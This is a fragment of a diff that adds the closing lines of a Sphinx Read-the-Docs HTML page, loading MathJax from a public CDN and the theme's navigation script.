+      <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+  
+
+  <script type="text/javascript" src="../_static/js/theme.js"></script>
+
+  <script type="text/javascript">
+      jQuery(function () {
+          SphinxRtdTheme.Navigation.enable(true);
+      });
+  </script> 
+
+</body>
+</html>
